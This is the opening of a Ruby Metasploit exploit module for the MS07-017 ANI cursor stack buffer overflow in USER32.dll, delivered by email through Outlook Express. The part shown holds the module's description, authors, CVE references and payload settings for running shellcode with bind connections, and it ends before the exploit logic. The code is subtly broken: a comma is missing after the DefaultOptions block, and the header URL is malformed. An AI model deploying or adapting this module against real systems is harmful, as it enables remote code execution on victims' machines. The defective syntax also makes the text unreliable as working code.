##
# This module requires Metasploit: https://metasploit/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  #
  # This module sends email messages via smtp
  #
  include Msf::Exploit::Remote::SMTPDeliver

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Windows ANI LoadAnIcon() Chunk Size Stack Buffer Overflow (SMTP)',
      'Description'     => %q{
        This module exploits a buffer overflow vulnerability in the
        LoadAniIcon function of USER32.dll. The flaw is triggered
        through Outlook Express by using the CURSOR style sheet
        directive to load a malicious .ANI file.

        This vulnerability was discovered by Alexander Sotirov of Determina
        and was rediscovered, in the wild, by McAfee.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'hdm',    # First version
          'skape',  # Vista support
        ],
      'References'      =>
        [
          ['MSB', 'MS07-017'],
          ['CVE', '2007-0038'],
          ['CVE', '2007-1765'],
          ['OSVDB', '33629'],
          ['BID', '23194'],
          ['URL', 'http://www.microsoft.com/technet/security/advisory/935423.mspx']
        ],
      'Stance'          => Msf::Exploit::Stance::Passive,
      'DefaultOptions'  =>
        {
          # Cause internet explorer to exit after the code hits
          'EXITFUNC' => 'process',
        }
      'Payload'        =>
        {
          'Space'       => 1024 + (rand(1000)),
          'MinNops'     => 32,
          'Compat'      =>
            {
              'ConnectionType' => '-bind -find'
            },

          'StackAdjustment' => -3500,
        },
